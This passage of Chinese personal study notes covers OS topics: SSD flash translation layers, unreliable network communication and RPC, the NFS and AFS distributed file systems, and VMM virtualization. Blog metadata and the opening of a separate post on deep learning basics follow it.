一般会将数据并行写在多个闪存存储芯片上（这点跟有多个盘面的机械硬盘其实是一样的）；另外需要降低写放大； 写放大 &#x3D; FTL 发给闪存芯片的指令数量 &#x2F; 文件系统发给 FTL 的指令数量 为了提高使用寿命，FTL 需要将数据尽可能均匀的写入到所有存储单元中，避免某些存储单元被写入的更多，导致过早老化； 为了减少写入干扰，FTL 通常会按页的顺序写入数据，从低页写到高页，避免无序写入，减少干扰几率； 实现 FTL 的最简单方式是使用直接映射，但是这会带来非常严重的问题，一是性能问题，因为写入页需要擦除块，因此会需要先复制块中的数据，之后再重新写入，这导致高昂的写入放大；二是寿命问题，文件的元数据不可避免会频繁更新，因此直接映射将导致某些存储单元也频繁更新，很快达到使用寿命的上限； 日志结构的 FTL文件系统中常用的日志结构刚好非常适合 FTL 的场景，每次更新数据的时候，都不覆盖旧的数据，而是在新的位置写入； 对于文件系统来说，哪些空间是空闲的，是由它自己在管理的，这意味着文件系统有自己的一套块编号系统，该系统与 SSD 内部的页编号并不相同，因此 SSD 内部还需要提供一张映射表，记录文件系统的块，对应自己内部的哪个页； 示例：文件系统的块 100、101、2000、2001，对应内部的页 0、1、2、3； 问题：SSD 需要将映射表存储在哪里？ 答：理论上猜测肯定是存储在 SSD 本身的存储单元里；对于日志结构策略来说，整个文件系统 imap 表是不断移动的，即随着数据更新，不断写入到最新的位置；而且单个文件的 inode 也会随着更新，不断在变化位置；数据块也是如此；只有当 inode 和数据块中的数据没有发生改变时，它们的位置才是固定的； 但是以上的分析是站在文件系统的角度，对于 SSD 来说，它还有额外的一个翻译映射层，即需要将文件系统的逻辑块，映射到自己的物理块地址；这个映射表是独立于文件系统的 imap、inode 之外的；它是对 inode 中读取到的指针的再次翻译好像？ 没错，而且有些 SSD 内部还有专门的 RAM 内存，用来在运行时加载该映射表，以提高翻译的速度；当然，有些 SSD 的策略是加载到主机的内存里，共享主机的内存，但由于不能无限占用主机的所有内存，肯定会设置一个上限；有可能这个上限小于整个映射表的大小，此时只能加载部分映射表到主机的内存中；由此当发生缓存不命中时，就需要先从闪存中读取未命中的映射数据，加载到内存里；这样的话， 对于主机来说，一条读取数据的指令，其实发生了两条从闪存中加载数据的指令，一次是加载映射表，一次是加载目标数据； 发现 SSD 内部的页表映射机制，跟 CPU 的虚拟内存地址映射是一毛一样的； 日志结构的 FTL 有两个缺点： 由于新数据总是写入新位置，而不是覆盖旧数据，这意味着旧位置的数据变成垃圾，需要定期清理，以便能够回收空间；但过度的垃圾回收会增加写放大和降低性能； 随着 SSD 容量的变大，SSD 内部需要越来越大的内存，以便能够存储映射表； 垃圾回收对于任何使用日志结构的系统来说，垃圾回收都将是不可避免的；当 SSD 决定运行垃圾回收时，它可以通过读取页中的块编号，并查询映射表，但相应的块编号指向的页编号是否匹配，如果不匹配，意味着该页已经变成了死页，或者叫垃圾页，可以进行回收；如果块中只有部分页是死页，部分页是活页，那么回收成本很高；因为 SSD 需要先将活页的数据复制出来，并写入到新的页中；为了降低回收成本，更好的办法是优先回收那些全部由死页构成的块，这样就不需要复制和写入数据了； 以上机制的成本仍然不低，因为需要扫描整个 SSD；由于文件系统本身也维护着空闲空间的管理，因此文件系统自己也清楚哪些逻辑块是垃圾块；SSD 可以通过提供一个额外的 trim 接口，让文件系统调用，告知哪些块可以释放，然后直接在 FTL 释放它们即可，少去了扫描的成本； 问：好奇 SSD 内部 FTL 如何管理自己的空闲空间？还是说直接不管理，交给文件系统来处理？万一有的文件系统没有这个功能呢？ 映射表尺寸块映射块映射是一种直接映射，目的是为了减少页表的大小时，因为如果按页进行直接映射的话，假设一条映射条目（页指针）需要占用 4 比特的空间，对应一个 4KB 的页；那么对于 1TB 的 SSD 来说，将需要 1GB 缓存以存储映射表，显然，这个映射成本太高了；如果换成使用块映射（块指针）的话，可以省下缓存空间，但是付出的代价是降低了性能，因为任何一个页的数据变更，都将导致整个块的迁移重写； 混合映射为了解决块映射的性能问题，FTL 引入了混合映射；它的策略是使用两个映射表，一个是日志表（负责页映射），一个数据表（负责块映射）；这样既能够得到页映射的性能，又能够得到块映射的空间； 当 FTL 收到文件系统的数据读取指令后，优先到页映射表中查找物理地址，如果找不到，再到块映射表中查询； 貌似优先到页映射表中查找，可以利用上局部性原理的好处； 当 FTL 收到文件系统的数据写入指令后，先将数据写入新的块，然后将新块的地址保存页映射表中；当某个新块中的页都按顺序被写满后，就把该块的地址迁移到块映射表中； 切换合并块中的页写满后，由原来的页映射切换为块映射； 部分合并假设出现了只有部分页被重写的情况，则 FTL 需要将未被重写的页，复制一份到新的块中；完成这个动作需要额外的 I&#x2F;O 操作，因此会导致一定的写放大； 完全合并假设某个日志块中的四个页，分别写入了四个不同的逻辑块的数据；当需要将它们从日志表迁移到数据表时，就需要做很多动作；需要读取每个逻辑块余下的页的数据，然后新建一个物理块，写入这些数据；同样的操作，每个逻辑块都需要做一遍，共做四遍； 页映射缓存由于混合映射过于复杂，另外一个解决方案是仍然使用页映射，但为其引入缓存机制（这个机制跟 CPU 中的虚拟内存地址映射缓存一毛一样）；其思路就是使用有效的缓存，来完成映射的工作；由于缓存有限，此时不再能将整个映射表一次加载到缓存中了，只能是部分加载（并且如果满了后，还需要剔除部分不常用的）；由于计算过程中必然存在的局部性，这种机制工作起来能够取得性能和成本的良好平衡； 减缓老化为了避免某个存储单元由于频繁擦写，导致过快出现老化， FTL 需要尽可能的将写入分摊到所有存储单元中；虽然日志写入策略，能够很好的实现分散化；但是电脑中的部分数据有可能在写入之后，就很被再次改写了，这样导致这些存储单元没有分摊到应尽的责任；为了避免这个问题， FTL 需要定期将这些不活跃的数据，迁移到其他存储单元，以便激活它们，承担更多的写入责任； 看来 FTL 还需要额外承担不时照看那些数据长期不更新的块，不定期把块中的数据迁移到其他写入次数比较多的块，以便可以利用这些数据长期不更新块的使用寿命； 性能和成本 SSD 的随机写入之所以比随机读取性能更好，其原因在于内部 FTL 使用的日志策略；该策略将随机写入在一定程度上转变成了顺序写入； 按理说机械硬盘也存在着相同的现象； 37.分布式系统分布式系统需要应对诸多方面的挑战，包括机器故障、数据包丢失、网络延迟、安全保障等； 通信常态不可靠的通信是网络中的常态，少数情况是由于电气原因引起的，多数是由于某个节点的缓冲区不足造成的；由于该节点在单位时间内收到了超过其本身内存可存储的数据包，迫使其必须丢弃一些后到的数据包，因此造成了丢包的现象； 问：既然丢包是网络中的常态，那应如何应对丢包的问题？ 答：从通信协议入手； 不可靠的通信层应对不可靠通信的方法之一是：不管它；因为对于某些应用程序来说，丢失一些数据包问题不大（例如视频类的应用）；或者其内部有其他应对丢包的方法（例如通过校验和确认完整性，当发现丢包时，要求对方重发）； 可靠的通信层构建可靠的通信涉及到四个动作： 确认的动作：acknowledgment，简称 ack；当接收方收到数据包后，发送一条 ack 消息给发送方，让发送方知悉数据包已经安全到达； 判断超时的动作：timeout；当发送方在一定的时间内，未收到接收方发回的 ack 消息，则判断数据包在传输的过程中丢失了； 重试的动作：当发送方判断数据包丢失后，重新发送一次数据包； 编号的动作：如果接收方发送的 ack 消息在路上丢失了，发送方会重新发送数据包；为了让接收方知悉收到了重复的数据包，双方就每次要发送的数据包进行顺序的编号；这样如果接收方收到相同编号的数据包，则只需要发回 ack 消息，而无须额外处理该数据包； 超时时间的设置是一个有意思的点，设得太小的话，发送方要消耗更多的 CPU 和带宽；设得太大的话，发送方提供的服务性能降低； 由于单个服务器经常对应多个客户端，因此有可能某个时间点，服务器会收到很多客户端的请求，导致过载；如果这些客户端都在一个固定的超时间隔后，再次发起重试的请求，将再次导致服务器过载，之后一直不断陷入死循环。为了避免这种情况发生，一般重试的时间间隔采用“指数倒退”的方案，即下一次重试的时间，是上一次的倍数，例如2倍； 分布式共享内存DSM，Distributed Shared Memory，它的构想是我台机器共享一个大的虚拟地址空间，当访问某个不在本地内存中的数据时，触发页错误，然后由操作系统调用网络通信，访问其他机器上面的数据； 这种分布式方案不是很有实用性，因为本地机器的优点在于 CPU 和快速的内存，现在将内存做成分布式的，反而自断长处了；更好的做法可能是将数据做成分布式的，将数据通过网络分发到多台机器上进行计算，最后再网络汇总各台机器的计算结果即可； 远程过程调用 RPCRPC，remote procedure call；其思路是像调用本地机器上的函数一样，调用远程机器上的代码并执行它；RPC 系统通常由两部分组成，存根生成器（stub generator）和运行时库（runtime）； 存根生成器既然是远程调用，不可避免涉及到与远程的机器进行通信，如果每个调用的应用程序，都需要自己处理这些通信的细节，既低效也容易出错。因此，所谓的存根生成器，其实就是对通信动作的抽象，让调用它的应用程序，可以不用关心底层的实现细节，像调用普通函数一样调用 RPC 即可； 好奇存根生成器跟普通的 HTTP 请求有什么本质上的区别？ 客户端存根生成器执行的动作： 创建缓冲区（申请一段内存空间）； 将消息放到缓冲区中：包括调用的函数 ID、函数参数、消息长度等； 将消息发送到 RPC 服务器上； 等待回复 收到回复，解包返回的数据，例如状态码、调用结果等； 返回结果给调用者； 服务端的存储生成器执行的动作； 解包客户端发过来的消息：提取函数 ID 和参数； 调用实际的函数； 打包结果，放入回复的缓冲区； 发送结果给客户端； 运行时库运行时库才是真正处理底层的脏活和累活，例如机器路由、传输协议等；它的职责是解决性能和可靠性的问题； 为了提高调用效率，运行时库一般构建在 UDP 协议上，然后将可靠性交给运行时库自己内部来处理；虽然 TCP 协议可以帮忙处理可靠性的问题，但由它处理的层级比较低，并不能取得最好的性能； 其他问题多久超时虽然设置了超时机制，但并不是万能的；因为有些远程调用本身确实需要很长的处理时间，如果一刀切的将它们判断为调用失败，并重新发送消息显然是不合适的；此时应该向服务端请求最新状态，如果对方回复仍在处理中，则应该继续保持等待； 超大参数有时传输的参数可能很大，此时运行时库需要提供消息的分组功能和重组功能； 不同字节序还有另外一个讨厌的问题是不同的机器可能使用不同字节序，有些使用大端法，有些使用小端法；因此，RPC 通常会在其消息体中明确标识当前消息内容所使用的字节序，以免对方弄错，并根据需要进行转换； 单台机器的故障概率是很小的，但是当一个系统是由几千台机器组成时，故障变成了大概率的事件；因此，如何正确有效的处理故障，则构建分布式系统的首要问题； 38. Sun 的网络文件系统（NFS） 如何构建共享文件系统？要考虑哪些问题？哪些点容易出错？ 基本分布式文件系统通常情况下，应用程序访问本地的文件系统来获取想要的持久性数据，对于分布式文件系统来说，应用程序改成访问客户端文件系统，它提供了一层抽象，接口仍然同普通的文件系统一样，所以对于应用程序来说，是透明无感知的； 开放协议最早的比较成功的分布式文件系统是 SUN 公司开发的 NFS，它通过制定协议的标准，引导行业人员采用该协议，并可以自行开发自己的 NFS 服务器，而不是限定只能使用 SUN 公司的版本，这种做法使用该协议迅速成为行业的标准； 目标：简单快速的崩溃恢复对于多客户端单服务器的场景来说，实现快速的崩溃恢复是非常重要的，因为在崩溃期间，客户端完全无法使用文件系统；NFSv2 采取的做法是使用无状态的协议，这使得服务器端无须管理客户端当前的状态，从而最大程度的降低崩溃恢复成本； 无状态与映射普通文件系统的系统调用是基于有状态的场景来设计的（例如使用文件描述符），如果想在客户端和服务器之间实现无状态的协议，就需要对原始的系统调用做一次封装；它们之间不可以是简单的 RPC，只是传递函数名称和参数，而是应该传递更多更完整的文件信息，包括卷标识、文件 inode 编号等；NFSv2 通过引入文件句柄来实现这一目的，每次通信，客户端都需将文件句柄传递给服务端，用来告知服务器自己想访问的是哪一个文件； 文件句柄：用来唯一标识服务端文件或目录的一种机制；它的思路其实很简单，本来文件系统上的各个文件原本就有唯一标识，现在将这些唯一标识的信息封闭成文件句柄的形式；这样当客户端给出某个文件句柄时，就能定位到某个具体的文件或目录；同时客户端会发送对这些文件的操作名称（即系统调用名称），服务端按要求进行操作即可； 世代号：一个新玩意，用来标识当前客户端读取的文件位置的状态； 虽然服务器端是无状态的，但是客户端的文件系统是有状态的；它会创建本地的文件描述符，来映射服务器返回的文件句柄，并且记录当前文件的位置，之后做为偏移量的参数，包含在请求中，发送给服务端； 客户端文件系统有维护一张映射表，映射每个路径下的文件和目录在服务端的对应句柄； 处理服务器故障通信故障是网络常态，因此客户端发出的请求有可能在中途丢失，另外服务器端也有可能处于崩溃重启的状态，无法正常响应客户端的请求；客户端通过超时重试的机制，来应对通信故障的场景； 对于大多数的只读操作来说，不管客户端发出几次相同的请求，最终得到的结果都是一样的（即这些操作具有幂等性）； 对于写操作来说，也是幂等的，因为在相同位置多次写入数据，最终得到的结果仍然是相同的； 对于创建目录的操作来说，则没有幂等性，因为如果目录已经存在了，则再次创建会返回失败的消息； 提高性能：缓存就像本地机器在将数据写入硬盘时，会使用缓存机制实现集中批量写入，以提高性能的做法一样 ，客户端文件系统与服务端之间，也可以引入缓存；让数据的读取和写入的性能更好； 缓存一致性问题当多个客户端都对同一份文件中的数据进行缓存时，就会出现缓存一致性的问题；因为有可能某个客户端在其缓存中更新了文件数据，但暂时未推送到服务器上面，则此时其他客户端看到的仍然是旧版本的数据； 貌似可以引入类似 git 的文件版本管理机制； NFS 通过两个机制来解决缓存一致性问题： 关闭时刷新：当客户端关闭某个文件后，出现缓存中有一些更新未推送到服务器，则将马上触发推送。以便其他客户端随后登录文件系统时，能够看到最新版本的数据； 打开时检查：当客户端访问某个文件时，如果发现本地已经有缓存，此时它会先向服务端发送一个请求，检查服务端的版本是否和本地缓存一致，如果不一致，则不使用缓存，而是从服务器拉取最新的版本； 客户端在检查本地文件缓存是否为最新版本时，需要设置一个检查的时间间隔，避免过于频繁的向服务器发起请求，不然服务端会收到大量的 GETATTR 请求，但实际上在大部分时间内，文件本身并没有什么变化； 服务端缓存的隐藏问题不止客户端会使用缓存机制，事实上服务器端的内存与硬盘的交互之间，也存在缓存机制，这会带来一个隐含的一致性问题；即如果服务端在收到某个客户端的写入请求后，并没有将数据立即写入持久性设备硬盘，而只是先写在了内存中，并向客户端报告已经成功写入；如果此时服务器发生崩溃，则未写入的数据将会丢失，但是客户端却误会以为已经成功了； 这个问题很棘手，并且不可避免，有两种常见的应对办法： 在服务端增加一个有备份电池的内存，这样即使服务端出现断电或崩溃，数据也不会丢失； 服务端使用专门为快速写入磁盘而设计的文件系统，以避免普通磁盘在处理立即写入时产生的性能问题； 39.Andrew 文件系统 AFSAFS 版本1版本一的设计思路是全文件缓存，即首次打开文件后，就将整个文件下载到本地磁盘，后续的读写操作都在本地运行，调用本地文件系统的接口即可，无需网络通信，性能很好；当文件关闭后，再将修改传输回服务器； 第二次打开文件时，会检查文件的本地版本和服务器版本是否一致，若一致，则直接使用本地副本，不再从服务端拉取； 存在的问题： 路径查找成本比较高：每个客户端发送一个请求，服务端都需要按完整的路径进行文件定位，消耗了很多服务器的CPU 时间； 类似 NFS，客户端发出很多版本检查的请求，占用了大量服务端的 CPU 和带宽； AFS 版本2针对版本1存在的问题，版本2引入了以下的解决方案： 反复查询状态问题：引入了回调机制，即文件版本是否变更，不再由客户端发起查询，而是由服务端来通知客户端（貌似这需要保持一个长连接，不然通知不到了）； 反复查找路径问题：引入文件标识符（FID，file Identifier，类似 NFS 中的文件句柄）来替代路径名；客户端在查找路径过程中，缓存结果在本地，这样下次查找，可以通过本地缓存找到路径对应的文件标识符，之后发送标识符到服务端即可，避免了服务端反复查找路径的问题（貌似借鉴了 NFS 中文件句柄的机制）； 注意：每次客户端从服务端获取一个文件或者目录时，都会在服务端建立一个回调，以便让文件或目录有变更，服务端可以通知客户端更新； 后来发现服务端的更新通知非常简单粗暴，只是中断回调而已，其他啥事也没有做；当客户端发现回调中断后，就到服务端重新拉取最新的版本； 缓存一致性更新可见性和缓存过期问题：当客户端关闭一个文件时，如果文件发生了变更，客户端就在第一时间将文件推送到了服务端；之后服务端会中断其他打开该文件客户端的回调；这样其他客户端就在第一时间知道了文件发生了更新，顺带解决了缓存过期问题； 当同一个客户端的不同进程，打开同一份文件时，由于本地缓存的存在，A 进程对文件的更新，对于 B 进程来说是实时可见的，因为它们都是访问的本地缓存，虽然此时服务端的版本可能是旧的，因为本地缓存的更新暂时还没有推送到服务端； 如果两个客户端同时修改一个文件，AFS 执行最后更新者胜出的策略，即以最后一个将更新推送到服务端的版本为准； 崩溃恢复崩溃有两种情况，一种是客户端崩溃，一种是服务端崩溃； 当客户端崩溃后，其原本和服务端建立的连接将失效，此时如果服务端的文件发生了变更，则服务端将无法通知客户端该变更；因此，客户端在崩溃恢复后，应该将本地的缓存视为可疑，重新和服务端建立连接，并确认版本是否有过期； 当服务端发生崩溃后，由于回调都存储在内存中，因此所有的回调将失效，服务端再也无法主动联系客户端并推送消息了；有两种办法可以解决该问题： 客户端定期检查与服务端的连接是否正常，如果发现服务端掉线，则立即将本地所有缓存标记为可疑，之后当访问本地缓存时，就跟服务端确认一下版本； 当客户端和服务端再次建立连接后，服务端主动告知客户端其本地缓存应该标记为可疑； 此处碰到的问题，都很像是使用 websocket 进行消息通知时会遇到的问题； 扩展性和性能优点： AFS 受益于在本地磁盘缓存整个文件内容，因此虽然大多数情况下，AFS 和 NFS 的性能差不多，但如果是机器重启后，对文件发起第二次的访问，则 AFS 将胜出，因为 NFS 没有本地磁盘副本，将需要再次通过网络下载文件，导致慢很多； AFS 另外一个优点是增加了扩展性，因为减少了很多请求的处理，单台服务器能够支持的客户端数量变得更多了； 缺点： 由于 NFS 缓存的是文件中的某个块，而不是整个文件，因此在某些场景下，它的性能将优于 AFS，即对文件中做出局部修改时，此时 NFS 可以只从服务端拉取对应的块即可，然后改写后推送到服务器；此时 AFS 需要先将整个文件从服务端下载下来，占用了很多时间；另外，改写完后，还需要将整个文件再推送回服务端，如果文件很大的话，速度将会很慢； 没有完美的系统，只有根据工作场景选择最匹配的系统； 貌似 AFS 的机制很像 github 的机制； 40.虚拟机管理程序 VMM：virtual machine monitor，虚拟机管理程序（hypervisor），它可以实现在现在的操作系统中，额外添加一层虚拟化； 用途 开发人员：方便在同一台机器上，实现不同 OS 下的代码调试和测试； 普通用户：方便在同一台机器上，使用不同 OS 下的应用程序； 运维人员：提高服务器的硬件资源使用率； 虚拟化 CPUVMM 的职责需要对安装在其上的虚拟操作系统模拟一切的硬件，包括 CPU、内存、磁盘等；对于普通操作系统，在启动的时候，它会将各种异常处理例程的地址，提前写入到硬件中，以便在发生异常时，硬件可以根据地址，找到异常处理程序来处理异常；对于 VMM 来说，当它启动一个虚拟操作系统时，它需要拦截虚拟操作系统发出的写入异常处理例程的指令，并记录下指令内部的异常处理程序地址； 由于 CPU 本身是受限直接执行的，因此很好奇 VMM 如何让虚拟 OS 在执行到特权指令后，能够陷入到自己的代码，而不是触发错误？猜测此处需要 CPU 的支持才行，即 CPU 必须支持除了内核模式和用户模式外的第三种甚至第四种模式，虚拟 OS 运行在这种模式中，并且在该模式下，虚拟 OS 发出的特权指令，会触发 VMM 已经提前在 CPU 中写好的自己的异常处理，然后接下来陷入 VMM 的代码，由 VMM 接管并处理虚拟 OS 发出的特权指令； 由于 CPU 对于内部程序来说是完全透明的，因此应用程序发出的全部是 CPU 可以直接解读和处理的指令集；当 VMM 监控到应用程序发出了系统调用时（如何实现监控？或许可以考虑让虚拟机的应用程序运行在某种特殊的用户模式下），里面其实包含一个触发异常的指令（正常情况下，执行该指令会陷入系统，即切换到操作系统提前指定的异常处理程序，并切换到内核模式）；当 VMM 发现应用程序发出这种指令时，VMM 就拦截它，并替换成之前记录的虚拟 OS 的异常处理程序的地址；CPU 根据该地址，读取内存中对应的异常处理程序，开始处理应用程序发出的系统调用； 由于虚拟 OS 内部的应用程序也是受限直接执行的，因此当它发出系统调用时，它也应该是要触发 VMM 在 CPU 中提前写入的异常处理程序，让其陷入 VMM 的代码，由 VMM 来接管应用程序发出的系统调用，而不是由陷入主机的 OS 进行处理； 不同虚拟 OS 之间的切换VMM 有可能同时管理着多个虚拟 OS，当想实现不同的虚拟 OS 之间的切换时，VMM 需要记下每个虚拟 OS 的状态，包括各个寄存器、程序计数器（PC）的值等；切换时，VMM 就把这些值写入到 CPU 中的寄存器和 PC 中，这样就实现切换了； 通过时间分片，CPU 定期陷入到内核模式中，执行 OS 的代码指令；好奇在 VMM 下，由于 VMM 只是一个普通的应用程序，它如何确保分配到足够多的时间片，来运行其中的虚拟 OS 的虚拟应用程序？还是说，这些虚拟的东西加在一起，能够分配到的时间片，只是跟主机上面的应用程序的比例是一样的？ 普通 OS 下的应用程序实现系统调用在普通的 OS 环境中，当应用程序想要执行某个系统调用时，它提前先将各项参数准备好，写入寄存器中，然后执行约定好的特殊指令；CPU 在收到这条特殊指令后，找到之前 OS 给它的该特殊指令的映射地址，写入程序计数器，并更新状态为内核模式，接下来舞台就交给 OS 了； VMM 必须拦截虚拟 OS 的特权操作VMM 不可能让虚拟 OS 实现特权操作，因为 VMM 本身也只是一个普通进程，并没有权限去帮忙虚拟 OS 实现任何的特权操作，因此它必须想办法拦截虚拟 OS 发出的各种特权操作，不然如果直接让指令进入 CPU ，会触发异常，并导致程序终止； 问：如何拦截呢？有一个办法是当虚拟 OS 尝试执行特权操作时，就让它陷入 VMM 中；这样 VMM 就有机会记录到特权操作的内容，知道某个虚拟 OS 的异常处理程序，在内存中的地址；有了这个地址后，VMM 之后就可以扮演成一个硬件的角色； 那如何让虚拟 OS 的特权操作能够陷入到 VMM 中呢？暂时想到的一种办法是让虚拟 OS 运行在某种特定的内核模式下，在该模式下的特权操作，会陷入 VMM 中； VMM 必须拦截虚拟应用程序的系统调用在普通 OS 下，应用程序的系统调用，会交给 OS 处理；由于 CPU 虚拟化使用的是受限直接执行的技术，因此 VMM 也必须拦截虚拟环境中的应用程序发出的系统调用，不能让它触发 CPU 中的主机 OS 的异常处理程序 问：如果主机的 OS 和虚拟 OS 版本一样的话，说不定也可以，即虽然操作不正确，但结果可能正确？不过这样做貌似很危险，因为虚拟应用程序在主机 OS 和虚拟 OS 的进程表中的代号并不相同，因此应该并不可行； 内存保护对于虚拟 OS 中的应用程序来说，需要限制其访问虚拟 OS 的数据，但是此时虚拟 OS 本身也是一个普通的应用程序，它的数据并不是存储在内核段中的；有两种办法可以解决这个问题： 额外的内核模式：MIPS 硬件提供了额外的管理员模式，可以让虚拟 OS 存放自己的数据，这些数据对普通应用程序不可访问； 内存保护：VMM 使用页表保护，让虚拟 OS 的数据仅对 OS 可用，对虚拟应用程序则不可访问；（当虚拟应用程序尝试访问虚拟 OS 的数据时，让其陷入 VMM，然后 VMM 检查地址是否合法） 虚拟化内存虚拟化方式 问题：VMM 如何虚拟化内存？ 答：莫非 VMM 使用基址映射，来帮忙 CPU 找到真正的 虚拟 OS 的指令地址？正确答案是，VMM 需要提供额外的一层映射，将机器内存虚拟化一层物理内存出来，让虚拟 OS 的地址空间和真正的机器内存之间，实现映射；而且，这种实现必须是透明的； 听上去 VMM 还需要扮演类似 TLB 的地址翻译角色； 由于虚拟 OS 可能不止一个，因此 VMM 需要为每个虚拟 OS 维护一张单独的映射表，这张映射表的大小取决于初始化的时候，为虚拟 OS 分配了多少机器内存；然后虚拟 OS 对物理内存的任何写入，都由该映射表转换到对本地机器内存的写入，并在表上记录着映射关系； 问：地址转换的过程是怎么样子的？ 地址转换过程 CPU 执行应用程序（虚拟OS中的）的指令，发现 TLB 缓存未命中，触发陷阱； 陷入 VMM 的缓存未命中处理程序；VMM 找到之前保存的虚拟 OS TLB 缓存未命中处理程序的地址；加载该地址中的指令到 CPU 中； CPU 执行虚拟 OS 缓存未命中处理程序：从虚拟地址 VA 中提取 VPN 虚拟页号；查找虚拟 OS 中的页表；如果页号存在并有效，取得物理页号 PFN；更新 TLB（特权操作，将触发陷阱）； 陷入 VMM 的陷阱处理程序；VMM 将虚拟 OS 提交的 VPN 到 FPN 的映射，转换成 VPN 到 MPN 的映射，更新 TLB；返回虚拟 OS； 虚拟 OS 从陷阱返回（非特权指令尝试从陷阱返回，将触发陷阱）； 陷入 VMM；从陷阱返回应用程序； 继续执行原触发陷阱的指令（指令重试），TLB 命中； 从以上过程可以发现，不管是虚拟 OS 中的应用程序，还是虚拟 OS，它们都是运行在非特权模式下的，因此，当它们尝试执行一些特权指令时，都发触发陷阱，陷入 VMM 的陷阱处理程序； 以上过程是指软件 TLB 的场景，如果是硬件支持的 TLB，则 CPU 将直接和自己内部的 TLB 翻译器打交道，当发生 TLB 未命中时，直接按照页表基址寄存器中的地址，到机器内存中，查找相应的映射，此时 VMM 是没有机会介入的；因此，VMM 必须保存一份影子页表供硬件 TLB 查询，并密切关注虚拟 OS 对页表的所有更改；当发现更新时，第一时间更新影子页表； 当虚拟 OS 中发生缓存未命中时，其成本要大于主机 OS 的缓存未命中；为了降低成本，一种思路是 VMM 在密切关注虚拟 OS 的页表更新时，存一份类似日志的记录，里面记录着 VPN 到 FPN 并到 MPN 的映射；这样当虚拟 OS 发生缓存未命中时，VMM 直接查询自己的日志，看是否有记录到该 VPN 的映射记录，如果有的话，直接返回 MPN；这样可以省去让虚拟 OS 到它的页表查询映射的环节； 信息沟多个虚拟 OS 的时间片分配VMM 并不知道虚拟 OS 的内部状态，由于信息差，它们有时候并一定能达到最高性能的配合状态；例如当 VMM 管理多个操作系统时，有些处于空闲状态，没有任务在其中运行；有些处于繁忙的状态，有很多任务在其中运行；此时如果 VMM 为两个操作分配一样的时间片，将不是效率最高的选择； 重复页清零当 OS 为进程提供某个内存页前，通常会将其置零，以免千万信息泄露；但是对于 VMM 来说，这种置零的动作有可能会发生两次，一次由主机 OS 分配页面给 VMM，一次由虚拟 OS 分配页面给其中的进程；两次置零的操作将增加性能成本； 半虚拟化半虚拟化：如果操作系统的设计者，知道自己的 OS 将有可能运行在虚拟化的环境中，并因此提前做出相应的设计，以减少信息沟，那么将有可能极大的提高该 OS 在虚拟环境中的运行效率（提高的程度甚至将接近于主机 OS 的运行效率）； Docker 使用了操作系统层的虚拟化，它并不是一种完整的系统虚拟机，而是将内核共享给多个独立空间中的应用程序；半虚拟化的例子是 Xen 项目；好奇 Xen 如何实现半虚拟化？","categories":[],"tags":[{"name":"软件","slug":"软件","permalink":"http://example.com/tags/%E8%BD%AF%E4%BB%B6/"},{"name":"操作系统","slug":"操作系统","permalink":"http://example.com/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"}]},{"title":"Python 深度学习","slug":"Python 深度学习","date":"2020-08-27T01:51:00.000Z","updated":"2024-09-21T11:25:40.429Z","comments":true,"path":"2020/08/27/Python 深度学习/","permalink":"http://example.com/2020/08/27/Python%20%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0/","excerpt":"","text":"1. 什么是深度学习人工智能、机器学习和深度学习人工智能将通常由人类完成的智能任务，尽量实现自动化； 机器学习 程序设计：输入数据和计算规则，输出计算结果； 机器学习：输入数据和结果，输出计算规则； 机器学习系统是训练出来的，而不是通过程序编写出来的 从数据中学习表示机器学习的三要素：输入数据点、预期输出的示例、衡量算法好坏的方法； 机器学习的核心：在预先定义的一组方法（即 hypothesis space 假设空间）中，找到一种有意义的变换数据的方法，使得数据转换成更加有用的表示 representation ； 深度学习之“深度”深度 depth 是指学习的过程，涉及很多层级的堆叠，所以深度学习也叫 hierarchical representation learning 层级表示学习（或 layer representation learning 分层表示学习）； 分层的做法，来源于神经网络模型（neural network）启发，但事实上它跟人类大脑的神经网络模型，并没有任何关系；只是恰好用这个启发来命名这个学习模型而已； 传统的机器学习因只注重1-2层的数据表示，因此有时也叫做浅层学习 shallow learning； 深度学习可以简单理解为：学习数据表示的多级方法；每一级的方法，就像是一个蒸馏的操作，虽然每经过一级数据变得越来越少，但纯度却越来越高，跟解决任务越来越相关； 用三张图理解深度学习的工作原理权重 weight ：神经网络中，某一层对数据所做的变换操作，存储于该层的权重中；权重是一组数字，它是该层操作的参数 parameter ；每层的变换，由权重来实现参数化 parameterize ； 学习的过程，即为神经网络中的所有层，找到最合适的一组权重值，使得输入的示例，能够与目标一一对应； 损失函数 loss function ：用于计算神经网络的预测值与真实目标值之间的距离值；损失函数有时也叫目标函数 objective function； 深度学习技巧：根据损失函数计算出的距离值，作为反馈信号，对权重进行微调，以降低损失值；这种调节由优化器 optimizer 来完成，它实现了反向传播 backpropagation 的算法； 整个调节的过程，称为训练循环；通过对几千个示例，做几十次的循环后，就有可能得到损失最小的网络模型； 机器学习简史概率建模朴素贝叶斯算法：基于朴素贝叶斯定理的分类器； logistic regression 逻辑回归（简称 logreg）：名字虽然有回归两个字，其实是一种分类算法，而不是回归算法； 早期神经网络Yann LeCun 使用卷积神经网络+反向传播算法，应用于美国邮政的手写邮政编码识别；早期的神经网络算法目前都被一些更现代的算法取代了； 核方法核方法是一种分类算法，其中最有名的是 SVM 支持向量机 support vector machine；其致力于在两级不同类别的数据集合中，寻找一个良好的决策平面（边界），从而解决分类问题； 步骤： 将数据映射到高维空间； 在高维空间中找到一个超平面，该平面使得两个类别的数据点之间的距离最大化； kernel trick 核技巧：由于映射高维空间很抽象，因此，可以通过核函数（kernel function）来简化这个过程；核函数的原理是抛弃高维空间，转而求数据点对之间的距离；之后根据求得的距离结果，来寻找超平面；但这也有缺点：当数据集很大时，或需要解决感知问题时，这一思路变得不那么可行；因为如果想将 SVM 应用于感知表示，则需要先提取有用的表示（即特征工程），但这个提取过程比较麻烦，而且也不太稳定，从而限制了 SVM 的使用场景; 决策树、随机森林与梯度提升机decision tree 决策树：挑出一个待选特征，对输入数据点进行分类，如果分类的数据符合目标，则特征有意义，如果不符合，则没有意义；通过对这个过程的反复迭代，最终得到由特征判断组成的整个决策树；另外决策树也可用于给定输入预测输出； random forest 随机森林：一种决策树学习算法；它首先构建很多决策树，然后再把这些决策集成起来；对于浅层学习任务，它几乎总是第二好的算法； 步骤： 数据随机抽取； 待选特征随机抽取； 对各子树的分类结果进行投票，量多者胜； 思想：相对于决策树寻找最厉害的专家的策略，随机森林的策略为：三个臭皮匠，顶个诸葛亮； gradient boosting machine 